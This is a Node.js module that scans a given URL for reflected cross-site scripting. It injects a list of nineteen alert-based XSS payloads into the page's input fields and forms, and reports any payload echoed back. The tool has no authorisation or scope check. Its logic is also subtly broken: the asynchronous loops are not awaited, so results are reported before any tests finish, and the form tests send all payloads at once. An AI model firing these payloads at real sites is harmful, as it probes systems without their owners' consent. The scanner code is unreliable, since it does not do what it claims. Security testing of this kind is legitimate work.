const axios = require('axios');
const cheerio = require('cheerio');

const payloads = [
    '<script>alert("XSS1")</script>',
    '<img src=x onerror=alert("XSS2")>',
    '<svg onload=alert("XSS3")>',
    '<body onload=alert("XSS4")>',
    '\'"--><img src=x onerror=alert("XSS5")>',
    '<iframe src="javascript:alert(\'XSS6\')"></iframe>',
    '<link rel="stylesheet" href="javascript:alert(\'XSS7\')">',
    '<table background="javascript:alert(\'XSS8\')">',
    '<div style="background-image: url(javascript:alert(\'XSS9\'))">',
    '<div onclick=alert("XSS10")>Click me</div>',
    '<object data="javascript:alert(\'XSS11\')">',
    '<embed src="javascript:alert(\'XSS12\')">',
    '<form action="javascript:alert(\'XSS13\')">',
    '<input type="image" src="javascript:alert(\'XSS14\')">',
    '<meta http-equiv="refresh" content="0; url=javascript:alert(\'XSS15\')">',
    '<xml><script>confirm("XSS16")</script></xml>',
    '<marquee onstart=alert("XSS17")>',
    '<xss id=x onfocus=alert("XSS18") tabindex=1>focus me!',
    '<style>@import "javascript:alert(\'XSS19\')";</style>'
];

async function testXSS(url, callback) {
    try {
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);
        const results = [];

        // Test XSS in input fields
        $('input').each(async (i, el) => {
            const name = $(el).attr('name');
            if (name) {
                for (const payload of payloads) {
                    const testUrl = `${url}?${name}=${encodeURIComponent(payload)}`;
                    const result = await sendPayload(testUrl, payload);
                    if (result) results.push(result);
                }
            }
        });

        // Test XSS in forms
        $('form').each(async (i, el) => {
            const action = $(el).attr('action') || url;
            const method = $(el).attr('method') || 'GET';
            for (const payload of payloads) {
                if (method.toLowerCase() === 'get') {
                    const testUrl = `${action}?${payloads.map((p, i) => `field${i}=${encodeURIComponent(p)}`).join('&')}`;
                    const result = await sendPayload(testUrl, payload);
                    if (result) results.push(result);
                } else {
                    const formData = payloads.map((p, i) => `field${i}=${encodeURIComponent(p)}`).join('&');
                    const result = await sendPayload(action, payload, formData, method);
                    if (result) results.push(result);
                }
            }
        });

        callback({ url, payloads: results });
    } catch (error) {
        console.error(`Error fetching URL ${url}:`, error);
        callback({ url, payloads: [] });
    }
}

async function sendPayload(url, payload, data = null, method = 'GET') {
    try {
        const response = method === 'GET' ? await axios.get(url) : await axios.post(url, data);
        if (response.data.includes(payload)) {
            return { payload };
        }
    } catch (error) {
        console.error(`Error sending payload to ${url}:`, error);
    }
    return null;
}

module.exports = { testXSS };
